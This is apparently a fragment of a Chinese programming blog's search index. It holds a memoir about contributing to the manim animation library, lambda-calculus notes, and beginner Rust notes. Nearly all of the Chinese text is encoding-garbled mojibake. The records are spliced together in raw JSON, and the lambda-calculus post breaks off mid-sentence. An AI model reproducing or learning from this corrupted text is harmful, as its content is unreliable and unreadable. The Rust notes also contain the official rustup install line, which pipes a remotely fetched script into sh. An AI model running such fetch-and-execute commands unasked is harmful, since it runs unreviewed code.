·ä¸€ä¸ªå¤šæœˆå­¦äº†C++çš„åŸºç¡€è¯­æ³•ï¼ˆå½“æ—¶ç­ä¸»ä»»å‘ç°äº†è¿˜æ¯”è¾ƒä¸é«˜å…´ï¼Œè¦æ±‚æˆ‘ä¸€ç›´ä¿æŒå¹´çº§å‰äºŒåï¼Œä½†æ˜¯å¾ˆæ˜¾ç„¶è¿™æ˜¯ä¿æŒä¸ä½çš„ï¼‰ åœ¨é«˜ä¸€çš„NOIp2018åï¼Œæˆ‘å‘ç°å­¦é•¿ä»¬éƒ½ä¸å¤ªä¼šä½¿ç”¨Linuxä»¥åŠbashï¼Œè€Œè€ƒè¯•çš„ç³»ç»Ÿè¿˜æ˜¯NOI Linuxæ‰€ä»¥å°±å†³å®šå¹²è„†åšå‡ ä¸ªè§†é¢‘æ”¾åœ¨Bç«™ä¸Šä¾›å¤§å®¶å‚è€ƒï¼ˆéƒ½æ˜¯é»‘å†å²ï¼‰å°±è¿™æ ·ï¼Œæˆ‘æˆä¸ºäº†ä¸€åupä¸» åœ¨è¶…å‰å­¦äº†ä¿¡æ¯ç«èµ›è¯¾çš„å†…å®¹ä¹‹åï¼Œæˆ‘å¼€å§‹ç”¨é‚£ä¸ªæ—¶é—´æ¥ç ”ç©¶å®‰è£…manimä¸ºäº†è§£å†³LaTeXçš„æŠ¥é”™é—®é¢˜ï¼Œæˆ‘è¯•è¿‡å¾ˆå¤šæ–¹æ³•ï¼Œæœ€åä½¿ç”¨dockeræˆåŠŸå®‰è£…äº†ç¯å¢ƒï¼ˆä¸ºæ­¤è¿˜èŠ±äº†ä¸€æ®µæ—¶é—´äº†è§£dockerï¼‰åœ¨åšå‡ºäº†ç¬¬ä¸€ä¸ªå¸¦æœ‰æ–‡å­—çš„åŠ¨ç”»ä¹‹åå¾ˆæ˜¯æ¿€åŠ¨ è¿™æ ·åœ¨2019å¹´å¯’å‡çš„æ—¶å€™æˆ‘æŠ½äº†ç‚¹æ—¶é—´æ¥ç»ƒä¹ ç»ƒä¹ manimï¼Œåˆ¶ä½œäº†æˆ‘çš„ç¬¬ä¸€ä¸ªmanimè§†é¢‘ã€ŒåŠ¨æ€è§„åˆ’-01èƒŒåŒ…é—®é¢˜ã€æ…¢æ…¢çš„ï¼Œåœ¨æ¯å¤©è‡ªä¹ çš„ä¿¡æ¯ç«èµ›è¯¾ä¸Šæˆ‘åˆå­¦äº†ä¸å°‘è®¡ç®—æœºæ–¹é¢çš„çŸ¥è¯†å½“æ—¶æƒ³è¦åšä¸€ä¸ªè‡ªå·±çš„åšå®¢ï¼Œåœ¨å­¦markdownæ—¶å‘ç°æ•°å­¦å…¬å¼ä¹Ÿæ˜¯ç”¨LaTeXå†™çš„è€Œä¸”äº†è§£åˆ°è¿™ä¸ªä¸œè¥¿å¯ä»¥æ’å‡ºå¾ˆå¥½çœ‹çš„æ–‡æ¡£ï¼Œæ‰€ä»¥å°±å¹²è„†åˆä»é›¶å­¦äº†LaTeXå­¦äº†LaTeXä¹‹åmanimå®‰è£…å°±ä¸å†å‡ºç°æ— æ³•è§£å†³çš„é—®é¢˜äº†ï¼Œä¹Ÿå°±å¯ä»¥é¡ºåˆ©å®‰è£…äº† åœ¨é«˜ä¸€ä¸‹é«˜äºŒä¸Šï¼Œæˆ‘ä¹Ÿæ˜¯å‡­ç€å…´è¶£åšäº†å‡ ä¸ªè§†é¢‘ï¼Œä»ä¸­ä¹Ÿé€æ¸åœ°å‘æ˜äº†manimçš„ä¸€äº›ç®€å•ç”¨æ³•ï¼Œä¹Ÿå°è¯•çœ‹äº†ä¸€äº›manimæºç å½“æ—¶è¿˜è§‰å¾—é‚£äº›æºç éƒ½è¿˜æ˜¯å¾ˆè¿œçš„ä¸œè¥¿ï¼Œè§‰å¾—è‡ªå·±èƒ½çœ‹æ‡‚ä¸€éƒ¨åˆ†å°±å¾ˆå¥½äº† åœ¨2019å¹´å¹´æœ«ï¼Œæˆ‘å‘ç°äº†åŒæ˜¯ä½¿ç”¨manimçš„upä¸» @cigar666ä¸€æ®µæ—¶é—´åï¼Œä»–å»ºç«‹äº†manimçš„äº¤æµç¾¤ï¼Œè¿™ä¸ªç¾¤ä¹Ÿé€æ¸åœ°å‘å±•å£®å¤§åœ¨è¿™ä¸ªç¾¤é‡Œæˆ‘ä¹Ÿå­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†ï¼Œæ•™äº†å¾ˆå¤šäººå…¥å‘manimï¼Œä¹Ÿè®¤è¯†äº†å¥½å¤šå¥½å¤šå…¨å›½å„åœ°çš„æœ‹å‹ é«˜äºŒçš„å¯’å‡ï¼Œæˆ‘è®¡åˆ’åšäº†FFTç®—æ³•é‚£æœŸè§†é¢‘ï¼Œåœ¨é‚£æœŸé—´ï¼Œæˆ‘éå¸¸æ´»è·ƒåœ°åœ¨ç¾¤é‡Œå›ç­”å„ç§é—®é¢˜æœ‰ä¸€æ¬¡æˆ‘ç»™å‡ºäº†ä¸€ä¸ªå¾ˆå¤æ‚çš„è§£å†³åŠæ³•ï¼Œè€Œmanimæºç ä¸­å…¶å®æ˜¯æœ‰è½®å­çš„è¿™æ—¶S570è¯´äº†ä¸€å¥â€œè¿˜æ˜¯æºç çœ‹çš„ä¸å¤Ÿâ€ï¼Œæˆ‘ä¹Ÿå°±ä»æ­¤æé«˜äº†ç›®æ ‡ï¼š â€œæˆ‘è¦çœ‹æ‡‚manimæºç â€ æˆç«‹MKé«˜äºŒçš„å¯’å‡ï¼Œç–«æƒ…çªå¦‚å…¶æ¥ï¼Œå‡æœŸä¹Ÿéšä¹‹å»¶é•¿è€Œå½“æ—¶å¤§éƒ¨åˆ†äººä¹Ÿéƒ½åœ¨å‡æœŸä¸­ï¼Œä¸ºäº†æ›´å¥½åœ°äº¤æµä»£ç ï¼Œæˆ‘åœ¨GitHubä¸Šå»ºç«‹äº†ç»„ç»‡ï¼Œå¹¶ä¸”æŠ•ç¥¨é€‰ä¸¾å‡ºäº†åç§°manim-kindergartenä¹‹ååœ¨ç¾¤å‹çš„åˆä½œä¹‹ä¸‹åˆè¿›è¡Œäº†å¾ˆå¤šèµ„æ–™çš„å®Œå–„ä¸ºäº†æ–¹ä¾¿å›å¤ä¸€äº›å¸¸è§çš„é—®é¢˜ï¼Œæˆ‘ä¹Ÿç¼–å†™äº†ã€Šmanimå¸¸è§é—®é¢˜ã€‹è¿™ä¸ªæ–‡æ¡£ï¼Œåœ¨ä¸€å¹´å¤šçš„å®Œå–„åï¼Œå®ƒå·²ç»è¿­ä»£åˆ°äº†3.1ç‰ˆæœ¬ åŒæ—¶æˆ‘ä¹Ÿé¡ºåŠ¿åšäº†å¾ˆå¤šæ¯”è¾ƒçŸ­çš„è§†é¢‘ï¼Œå‚åŠ äº†ä¸€äº›æ´»åŠ¨ï¼Œä¹Ÿè¢«å¦ˆå’ªå”è½¬å‘äº†ï¼Œè·å¾—äº†ä¸å°‘ç²‰ä¸ï¼Œä¹Ÿæ‹¿åˆ°äº†çŸ¥è¯†é¢†åŸŸä¼˜è´¨upä¸»çš„è®¤è¯è€Œä¸”MKå†…éƒ¨ä¹Ÿç»„ç»‡äº†å‡ æ¬¡è”åˆæŠ•ç¨¿ï¼Œå…±åŒå®Œæˆäº†ä¸€äº›è§†é¢‘å…¶ä¸­æˆ‘ä»¬çªå‘å¥‡æƒ³ï¼Œå°è¯•äº†ä½¿ç”¨manimæ¥åˆ¶ä½œmanimæ•™ç¨‹ï¼Œç»“æœè¿˜è›®ä¸é”™æ‰€ä»¥æˆ‘ä¹Ÿå°±å•ç‹¬åœ¨è¿™ä¸ªç³»åˆ—ä¸‹å®Œæˆäº†å‡ ä¸ªè§†é¢‘ åœ¨åˆ¶ä½œè¿™ä¸ªè§†é¢‘æ—¶ï¼Œæˆ‘ä¹Ÿåœ¨é€æ¸æ·±å…¥åœ°é˜…è¯»æºç ï¼Œæ„Ÿè§‰æ²¡æœ‰é‚£ä¹ˆæ™¦æ¶©éš¾æ‡‚ï¼Œä»£ç æ€è·¯è¿˜æ˜¯å¾ˆæ¸…æ™°æ­£å¥½æœ‰MKæˆå‘˜å¼€äº†ä¸€ä¸ªæ–‡æ¡£çš„repoæ¥æ±‡æ€»ä¸€äº›ç½‘ä¸Šçš„æ–‡æ¡£ï¼Œæˆ‘ä¹Ÿå°±æ­£å¥½æŠŠé‡Œé¢çš„å†…å®¹å½’çº³å½’çº³ï¼Œä¿ç•™äº†ä¸€äº›æœ‰ä»·å€¼çš„å†…å®¹ï¼Œä¹Ÿè¡¥å……äº†éƒ¨åˆ†ä¸­æ–‡çš„æ–‡æ¡£å­—ç¬¦ä¸²ï¼Œå°±è¿™æ ·å®Œæˆäº†ä¸€å¤§åŠä¸­æ–‡æ–‡æ¡£ ç–«æƒ…æœŸé—´ï¼Œæˆ‘ä¹ŸåŠ å…¥äº†manimçš„discordé¢‘é“ï¼Œåœ¨é‡Œé¢ä¹Ÿå¸®åŠ©äº†å¾ˆå¤šäººè§£å†³äº†manimä¸Šçš„é—®é¢˜æˆ‘å‘ç°discordä¸Šmanim channelçš„ç®¡ç†å‘˜æ˜¯eulertourï¼Œè€Œä¸”ä»–åœ¨GitHubä¸Šä¹Ÿæ˜¯manimçš„collaboratorï¼ŒåŒæ—¶è¿˜åšäº†å¾ˆå¤šé¡¹ç›®å½“æ—¶å°±åœ¨mkçš„QQç¾¤é‡Œè¡¨è¾¾äº†ä¸€ä¸‹å¯¹ä»–çš„ä»°æ…•ï¼Œç„¶åå°±æœ‰ä¸€ä¸ªç¾¤å‹è¯´äº†å¥ï¼š â€œå…¶å®ä½ ä¹Ÿå¯ä»¥â€ æˆä¸ºåˆä½œè€…ç–«æƒ…æœŸé—´åœ¨å­¦æ ¡æœºæˆ¿è„±äº§çš„æ—¶å€™ä¹Ÿç»å¸¸ä¼šè¯»ä¸€è¯»manimï¼Œè¿˜é¡ºä¾¿æŠŠä¸€ç›´å®¹æ˜“å‡ºç°çš„Texté—®é¢˜ä¿®å¤äº†ä¸€ä¸‹å½“æ—¶Grantæ­£åœ¨å¼€å‘åŸºäºOpenGLçš„manimï¼Œæ‰€ä»¥è¿™äº›pull requestä¸€ç›´æ˜¯eulertouræ¥mergeçš„ï¼Œä½†æ˜¯åœ¨ä»–åŠ å…¥äº†ManimCommunityä¹‹åå°±å·²ç»æ‰“ç®—å°†3b1b/manimè’åºŸæ‰ï¼Œå¾ˆå°‘æ¥ç®¡issueå’Œprï¼Œç”šè‡³æœ‰ç”¨çš„prä¹Ÿåªä¼šè®©äº¤åˆ°ManimCommunityé‡Œä½†æ˜¯æˆ‘è§‰å¾—è¿™æ¯”è¾ƒä¸å¥½ï¼Œæ¯•ç«Ÿè¿˜æœ‰å¾ˆå¤šäººæ­£åœ¨ä½¿ç”¨3b1b/manimï¼Œæ‰€ä»¥æˆ‘å°±åœ¨æš‘å‡çš„æ—¶å€™æŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæ€ç»™Grantå†™äº†ä¸€å°ä¿¡æ¥ç”³è¯·3b1b/manimå­˜å‚¨åº“ä¸Šçš„æƒé™ ç»“æœå‡ å¤©åGrantçœŸçš„å›å¤äº†ï¼Œä»–åŒæ„ç»™æˆ‘manimä¸Šçš„writeæƒé™ï¼Œä½†æ˜¯è¦å…ˆå’Œeulertouræ²Ÿé€šä¸€ä¸‹å‡ ä¸ªæœˆåçš„åä¸€å‡æœŸï¼Œæˆ‘æ”¶åˆ°äº†Grantå‘æ¥çš„æˆä¸ºcollaboratorçš„é‚€è¯·ï¼ˆå…¶å®ä¸­é—´ä¸€ç›´æ²¡æœ‰å›å¤æ˜¯å› ä¸ºæˆ‘çš„é‚®ä»¶è·‘åˆ°äº†Grantçš„åƒåœ¾ä¿¡ç®±é‡Œï¼‰ åœ¨æˆä¸ºcollaboratoråï¼Œæˆ‘mergeäº†ä¸€äº›æœ‰ç”¨çš„pull requestï¼Œå…³æ‰äº†ä¸€äº›æ²¡ç”¨çš„/å·²è§£å†³çš„/è€æ—§çš„issueåŒæ—¶æˆ‘ä¹Ÿå¤§è‡´äº†è§£äº†æ–°ManimGLçš„å¤§è‡´é€»è¾‘ï¼Œä¹Ÿå‘Grantæäº†å¥½å‡ é¡¹æ”¹è¿›çš„å»ºè®®ï¼Œä»–ä¹Ÿé‡‡çº³äº†å¾ˆå¤šéƒ¨åˆ† åœ¨å¼€å­¦äº†ä¹‹åï¼Œä¸ºäº†å¤ä¹ é«˜è€ƒï¼Œä¹ŸåŸºæœ¬æ”¾ä¸‹äº†manimä¸Šçš„æ´»åŠ¨ï¼ˆè¿˜æ”¶åˆ°äº†æ¥è‡ªGrantçš„ç¥ç¦ï¼‰åœ¨2021å¹´å¯’å‡ï¼Œåˆå› ä¸ºç–«æƒ…ä¸Šäº†ä¸€æ®µæ—¶é—´ç½‘è¯¾ï¼Œæˆ‘ä¹ŸåˆæŠ½æ—¶é—´æ¥ç©ä¸€ç©manimäº†é‚£æ—¶ManimGLå·²ç»åŸºæœ¬å®Œå·¥ï¼Œåœ¨ä¸€äº›å‡†å¤‡ä¹‹åï¼Œshadersåˆ†æ”¯è¢«åˆå¹¶åˆ°äº†masteråˆ†æ”¯æˆä¸ºäº†æ­£å¼ç‰ˆæœ¬æˆ‘ä¹Ÿä¸ºä¹‹å†™äº†å…¨æ–°çš„ä¸­è‹±æ–‡æ–‡æ¡£ï¼ˆè™½ç„¶è¿˜æ˜¯å¾ˆä¸å®Œå–„ï¼‰åœ¨é‚£ä¹‹åæˆ‘ä¹Ÿå¯¹manimåšäº†ä¸€äº›æ”¹å–„ï¼Œå…³é—­äº†ä¸€äº›è¿‡æ—¶çš„pull requestï¼Œæ‰“å¼€äº†disscussionï¼Œå‘å¸ƒæ–°çš„pythonåŒ…ç­‰ç­‰ å—¯ï¼Œç„¶åå°±æ˜¯å¼€å­¦-&gt;å¤ä¹ -&gt;é«˜è€ƒ é«˜è€ƒå‘æŒ¥çš„è¿˜ç®—æ¯”è¾ƒå¥½ï¼ŒæˆåŠŸè¿›å…¥äº†ZJU-Turingä¸ºäº†æ›´å¥½åœ°æ±‡æ€»ä¿¡æ¯ï¼Œåœ¨å‡æœŸé‡Œæˆ‘åˆä¸ºmkå†™äº†å®˜æ–¹ç½‘ç«™ï¼šmanim.org.cnç„¶åå°±æ˜¯å¼€å­¦åˆ°ç°åœ¨äº† åè®°æ˜¯manimåœ¨ä¸€æ­¥ä¸€æ­¥æ¨åŠ¨ç€æˆ‘å‰è¿›ä»æƒ³è¦ç”¨manimåˆ°æƒ³è¦çœ‹æ‡‚æºç åˆ°æƒ³è¦ä¸ºå®ƒåšå‡ºç‚¹è´¡çŒ®ä»ä¸€ä¸ªä»€ä¹ˆéƒ½ä¸ä¼šçš„åˆä¸­ç”Ÿå˜æˆäº†manimçš„collaboratorè¿™ä»…ä»…æ˜¯ä¸‰å¹´å•Šï¼ˆ æ‰€ä»¥ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ç»§ç»­åŠªåŠ›å§ å†™çš„å¤ªæ°´äº†ï¼Œåæ­£å°±éšä¾¿å†™å†™ï¼Œæƒ³åˆ°å“ªå†™åˆ°å“ªäº†ï¼Œæ²¡æƒ³åˆ°ä½ è¿˜çœŸçš„çœ‹åˆ°è¿™äº†_(:Ğ·ã€âˆ )_","link":"/p/6222a56.html"},{"title":"ã€ŒLearn LambdaCalculusã€#0","text":"å‰è¨€å‰æ®µæ—¶é—´ï¼ŒGZTimeä¹Ÿè·Ÿæˆ‘èŠè¿‡ä¸€äº›å…³äºlambdaæ¼”ç®—çš„ä¸œè¥¿å­¦Haskellçš„æ—¶å€™ä¹Ÿæ€»æ˜¯èƒ½å¬è¯´è¿™ä¸ªä¸œè¥¿çœ‹èµ·æ¥æŒºæœ‰æ„æ€ï¼Œæ¥å­¦å­¦_(:Ğ·ã€âˆ )_ é‚£æˆ‘ä¹Ÿå¼•ç”¨GZTimeå¼•ç”¨çš„çŸ¥ä¹åŒå­¦çš„ä¸€å¥è¯ï¼š åœ¨ä»‹ç»Î»æ¼”ç®—ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ”¾ç©ºä¸€ä¸‹æˆ‘ä»¬çš„å¤§è„‘ï¼Œå¿˜æ‰Cè¯­è¨€ï¼Œå¿˜æ‰å†¯Â·è¯ºä¼Šæ›¼æœºï¼Œå¿˜æ‰å›¾çµæœºï¼Œç”šè‡³è¦å¿˜æ‰0å’Œ1ï¼ŒåŠ å’Œå‡ã€‚æˆ‘ä»¬æ¥åˆ°ä¸€ä¸ªåªæœ‰ç¬¦å·çš„ä¸–ç•Œã€‚åœ¨è¿™ä¸ªæ–°çš„ä¸–ç•Œé‡Œï¼Œåªéœ€è¦å‡ æ¡ç®€å•çš„å®šä¹‰å’Œè§„åˆ™ï¼Œä¾¿å¯ä»¥æ„é€ å‡ºä¸å›¾çµæœºå®Œå…¨ç­‰ä»·çš„è®¡ç®—æ¨¡å‹ï¼Œå³å®ƒæ˜¯å›¾çµå®Œå…¨ï¼ˆTuring Completeï¼‰çš„ã€‚å’Œå›¾çµæœºä¸€æ ·ï¼Œè¿™ä¸ªè®¡ç®—æ¨¡å‹å¯ä»¥è§£å†³ä»»ä½•ä¸€ä¸ªå¯ä»¥æœºæ¢°è®¡ç®—çš„é—®é¢˜ï¼›ä¸å›¾çµæœºå€¾å‘äºç¡¬ä»¶å®ç°ä¸åŒï¼Œå®ƒæ›´å€¾å‘äºé€»è¾‘çš„æ¨ç†ã€‚å®ƒå°±æ˜¯Î»æ¼”ç®—ï¼ˆLambdaæ¼”ç®—ï¼‰ã€‚ lambda termä¸€ä¸ªåˆæ³•çš„lambdaè¡¨è¾¾å¼åˆè¢«ç§°ä¸ºlambdaé¡¹ï¼ˆlambda termï¼‰ï¼Œä»¥ä¸‹ä¸‰ä¸ªè§„å¾‹å½’çº³æ€§åœ°å®šä¹‰äº†ä¸€ä¸ªåˆæ³•çš„lambdaé¡¹ï¼š Variableï¼šä¸€ä¸ªå˜é‡ x æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªåˆæ³•çš„lambdaé¡¹ Abstractionï¼šå¦‚æœ M æ˜¯ä¸€ä¸ªåˆæ³•çš„lambdaé¡¹ï¼Œx æ˜¯ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆ (Î»x.M) ä¹Ÿæ˜¯ä¸€ä¸ªåˆæ³•çš„lambdaé¡¹ï¼ˆè¿™ç›¸å½“äºå®šä¹‰äº†ä¸€ä¸ª x -&gt; M çš„å‡½æ•°ï¼‰ Applicationï¼šå¦‚æœ M å’Œ N éƒ½æ˜¯åˆæ³•lambdaé¡¹ï¼Œé‚£ä¹ˆ (M N) ä¹Ÿæ˜¯ä¸€ä¸ªåˆæ³•lambdaé¡¹ lambdaè¡¨è¾¾å¼çš„ç»„æˆæœ‰å˜é‡ã€æŠ½è±¡ç¬¦å·Î»å’Œä¸€ä¸ªç‚¹.ã€æ‹¬å· æ‰€æœ‰lambdaé¡¹æ„æˆ$\\Lambda$ç©ºé—´ï¼Œé€šè¿‡ä¸Šè¿°åˆæ³•lambdaé¡¹çš„å®šä¹‰ï¼Œ$\\Lambda$ç©ºé—´çš„æ­£å¼å®šä¹‰æ˜¯ï¼š å¦‚æœ$x$æ˜¯ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆ$x\\in\\Lambda$ å¦‚æœ$x$æ˜¯ä¸€ä¸ªå˜é‡ä¸”$M\\in\\Lambda$ï¼Œé‚£ä¹ˆ$(\\lambda x.M)\\in\\Lambda$ å¦‚æœ$M, N\\in\\Lambda$ï¼Œé‚£ä¹ˆ$(M\\ N)\\in\\Lambda$ notationä¸ºäº†ä½¿lambdaè¡¨è¾¾å¼çš„è®°æ³•æ›´æ¸…æ™°ï¼Œå¯ä»¥æœ‰ä»¥ä¸‹ç®€åŒ–ï¼š ä¸€ä¸ªlambdaé¡¹æœ€å¤–ä¾§çš„æ‹¬å·å¯ä»¥çœç•¥ã€‚æ¯”å¦‚ (M N) å¯ä»¥å†™æˆ M N åº”ç”¨æ˜¯å·¦ç»“åˆçš„ã€‚æ¯”å¦‚ M N P è¡¨ç¤ºçš„å®é™…æ˜¯ ((M N) P) è¿™å’ŒHaskellä¸­å‡½æ•°å·¦ç»“åˆæ˜¯ä¸€æ ·çš„ æŠ½è±¡æ˜¯å°½å¯èƒ½å‘å³å»¶ä¼¸çš„ã€‚æ¯”å¦‚ Î»x.M N å®é™…ä¸Šè¡¨ç¤ºçš„æ˜¯ Î»x.(M N) è€Œä¸æ˜¯ (Î». M) N è¿™å’ŒHaskellä¸­lambdaè¡¨è¾¾å¼å‘å³ä¸€ç›´å»¶ä¼¸æ˜¯ä¸€è‡´çš„ï¼Œå› æ­¤ä¸€èˆ¬è¦ä¸ºlambdaè¡¨è¾¾å¼åŠ ä¸Šæ‹¬å· åµŒå¥—çš„å¤šä¸ªlambdaè¡¨è¾¾å¼å¯ä»¥ç¼©å†™æˆç±»ä¼¼å¤šå…ƒå‡½æ•°çš„æ ·å­ã€‚æ¯”å¦‚ Î»x.Î»y.Î»z.M å°±å¯ä»¥ç¼©å†™æˆ Î»xyz.M Free &amp; bound variablesåœ¨ä¸€ä¸ªlambdaè¡¨è¾¾å¼ä¸­ï¼Œä¹Ÿæœ‰è‡ªç”±å˜é‡ï¼ˆfree variablesï¼‰å’Œçº¦æŸå˜é‡ï¼ˆbound variablesï¼‰çš„æ¦‚å¿µã€‚ åœ¨lambdaé¡¹ Î»x.M ä¸­ï¼ŒÎ»xè¢«ç§°ä¸ºbinderï¼Œå®ƒå°†è¾“å…¥çš„xä¸Mä¸­çš„å˜é‡xç»‘å®šåœ¨ä¸€èµ·ï¼Œè¿™æ—¶xå°±æ˜¯çº¦æŸå˜é‡ï¼Œè€Œå…¶å®ƒçš„æ‰€æœ‰å˜é‡éƒ½æ˜¯è‡ªç”±å˜é‡ã€‚ &emsp;æ¯”å¦‚åœ¨è¡¨è¾¾å¼ Î»x.x+y ä¸­ï¼Œxå°±æ˜¯çº¦æŸå˜é‡ï¼Œyæ˜¯è‡ªç”±å˜é‡ã€‚ å¯¹äºä¸€ä¸ªlambdaé¡¹Mçš„è‡ªç”±å˜é‡æ„æˆçš„é›†åˆFV(M)ï¼Œä¹Ÿæœ‰ä¸€äº›è§„å¾‹éœ€è¦æ»¡è¶³ï¼š å¦‚æœ x æ˜¯ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆ FV(x) = {x} FV(Î»x.M) = FV(M) \\ {x} ï¼ˆMä¸­é™¤å»xä¹‹å¤–çš„å˜é‡éƒ½æ˜¯è‡ªç”±å˜é‡ï¼‰ FV(M N) = FV(M) âˆª FV(N) ï¼ˆMåº”ç”¨åœ¨Nä¸Šå¾—åˆ°çš„lambdaé¡¹çš„è‡ªç”±å˜é‡æ˜¯MNä¸¤ä¸ªlambdaé¡¹çš„è‡ªç”±å˜é‡çš„å¹¶é›†ï¼‰ Substitutionlambdaé¡¹ä¹Ÿæœ‰ä¸€ç§è®°æ³•å«åšæ›¿æ¢ï¼ˆsubstitutionï¼‰ï¼Œè®°æ³• t[x:=r] è¡¨ç¤ºå°†lambdaé¡¹tä¸­çš„è‡ªç”±å˜é‡xéƒ½æ›¿æ¢æˆrã€‚å®ƒæ»¡è¶³ä»¥ä¸‹è§„å¾‹ï¼š x[x:=r]=r ï¼ˆä¸€ä¸ªå˜é‡å°±æ˜¯è‡ªç”±å˜é‡ï¼Œå°†å…¶æ›¿æ¢æˆrå°±å˜ä¸ºrï¼‰ y[x:=r]=y if x!=y ï¼ˆå¦‚æœxå’Œyä¸ç›¸ç­‰ï¼Œé‚£ä¹ˆï¼‰","link":"/p/92a6fc79.html"},{"title":"ã€ŒLearn Rustã€#0 æ€»ç« ","text":"å­¦ä¹ ä¸€é—¨æ–°è¯­è¨€ä¹‹Haskell å‰è¨€Haskellå­¦çš„å·®ä¸å¤šäº†ï¼Œä¹Ÿæ²¡å•¥äº‹æƒ³å¹²äº†GZTimeä¹‹å‰ä¹Ÿè·Ÿæˆ‘æ¨èè¿‡RustæŒºå¥½ç©çš„è¿™å‡ å¤©çœ‹ä¸€çœ‹ä¸€æ ·ï¼Œæ²¡æœ‰æ•™ç¨‹ï¼Œåªæ˜¯æˆ‘çš„ç¬”è®°è€Œå·² InstallationMacä¸Šå®‰è£…åªéœ€è¦å®‰è£…rustupå³å¯ï¼š 1$ curl --proto '=https' --tlsv1.2 https://sh.rustup.rs -sSf | sh ç„¶åæ›´æ–°ã€å¸è½½ã€æ£€æŸ¥ï¼š 123$ rustup update$ rustup self uninstall$ rustc --version Rustä»£ç çš„åç¼€åæ˜¯.rsï¼Œé€šè¿‡rustc code.rsæ¥ç¼–è¯‘å‡ºäºŒè¿›åˆ¶æ–‡ä»¶codeå†è¿è¡Œ Cargoé€šè¿‡rustupå®‰è£…åè‡ªå¸¦cargoï¼Œå¯ä»¥é€šè¿‡cargo --versionæ£€æŸ¥ é€šè¿‡cargo new project_nameæ¥æ–°å»ºä¸€ä¸ªé¡¹ç›®ï¼Œè¿™æ—¶ä¼šåœ¨å½“å‰ç›®å½•ä¸‹è‡ªåŠ¨ç”Ÿæˆä¸‹é¢çš„ç›®å½•ç»“æ„ï¼š 123456project_name â”œâ”€â”€ .git/ â”œâ”€â”€ .gitignore â”œâ”€â”€ Cargo.toml â””â”€â”€ src â””â”€â”€ main.rs cargoä¼šæ ¹æ®è¾“å…¥çš„é¡¹ç›®åç§°æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”é»˜è®¤ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼ˆå¯ä»¥ä½¿ç”¨cargo new ... --vcs noneå–æ¶ˆç‰ˆæœ¬æ§åˆ¶ï¼‰ å…¶ä¸­main.rsæ–‡ä»¶ä¸­å°±æ˜¯ä¸€ä¸ªHell Worldç¨‹åºã€‚Cargo.tomlæ˜¯è¿™ä¸ªé¡¹ç›®çš„é…ç½®æ–‡ä»¶ï¼š 12345678[package]name = &quot;project_name&quot;version = &quot;0.1.0&quot;edition = &quot;2018&quot;# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html[dependencies] æ„å»ºã€è¿è¡Œã€å‘å¸ƒ ä½¿ç”¨cargo buildä¼šæ„å»ºè¿™ä¸ªé¡¹ç›®ï¼Œå¹¶ä¸”å°†å¯æ‰§è¡Œæ–‡ä»¶åˆ›å»ºåœ¨target/debug/æ–‡ä»¶å¤¹ä¸­ ä½¿ç”¨cargo runç›´æ¥æ„å»ºå¹¶è¿è¡Œè¿™ä¸ªé¡¹ç›® ä½¿ç”¨cargo checkæ£€æŸ¥é¡¹ç›®ï¼Œä½†ä¸ç”Ÿäº§å¯æ‰§è¡Œæ–‡ä»¶ã€ä¹Ÿä¸è¾“å‡ºç»“æœ ä½¿ç”¨cargo build --releaseæ¥å‘å¸ƒï¼Œäº§ç”Ÿä½†å¯æ‰§è¡Œæ–‡ä»¶åœ¨target/release/æ–‡ä»¶å¤¹ä¸­ï¼Œä¸ç”¨äºç›´æ¥buildï¼Œå®ƒä¼šè¿›è¡Œä¸€äº›ä¼˜åŒ–æ¥ä½¿ç¨‹åºè¿è¡Œåœ°æ›´å¿« å¸¸è§ç¼–ç¨‹æ¦‚å¿µå˜é‡letè¯­å¥ä¼šåˆ›å»ºä¸€ä¸ªå˜é‡ï¼Œä½†æ˜¯é»˜è®¤éƒ½æ˜¯ä¸å¯å˜çš„ï¼ˆimmutableï¼‰ã€‚å³ä¸€æ—¦ä½¿ç”¨letåˆ›å»ºä¸€ä¸ªå˜é‡å¹¶ä¸ºå…¶èµ‹å€¼ï¼Œé‚£è¿™ä¸ªå˜é‡å°†ä¸å…è®¸è¢«æ”¹åŠ¨ï¼Œå¦‚æœåœ¨ä»£ç ä¸­æ”¹åŠ¨äº†è¿™ä¸ªå˜é‡ï¼Œé‚£ä¹ˆå°†ä¸ä¼šé€šè¿‡ç¼–è¯‘ ä½†æ˜¯å¯ä»¥å†ä½¿ç”¨letè¯­å¥æ¥åˆ›å»ºä¸€ä¸ªåŒåå˜é‡ï¼š 12let x = 1;let x = x + 1; è¿™æ—¶ï¼ŒåŸæ¥çš„xå°±è¢«éšè—ï¼ˆshadowingï¼‰äº†ï¼ˆè¿™ç§æ–¹å¼çš„å‰åä¸¤ä¸ªxæœ¬è´¨ä¸Šè¿˜æ˜¯ä¸¤ä¸ªå˜é‡ï¼Œå®ƒä»¬å…è®¸æœ‰ç€ä¸åŒçš„æ•°æ®ç±»å‹ï¼‰ åœ¨letåé¢åŠ ä¸Šmutä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªå¯å˜çš„å˜é‡ï¼š 12let mut x = 1;x = x + 1; ä½†è¿™æ—¶xä¸èƒ½æ›´æ”¹æ•°æ®ç±»å‹ å¸¸é‡å¸¸é‡ä¸åŒäºå˜é‡ï¼Œå®ƒä¸€å®šæ˜¯ä¸å¯å˜çš„ã€‚å¸¸é‡é€šè¿‡constå…³é”®å­—åˆ›å»ºï¼Œè€Œä¸”éœ€è¦æ˜ç¡®æŒ‡å®šæ•°æ®ç±»å‹ï¼ˆRustå¸¸é‡å‘½åè§„èŒƒæ˜¯ç”¨å…¨å¤§å†™ï¼‰ï¼š 1const MAX_POINT: u32 = 100_000; 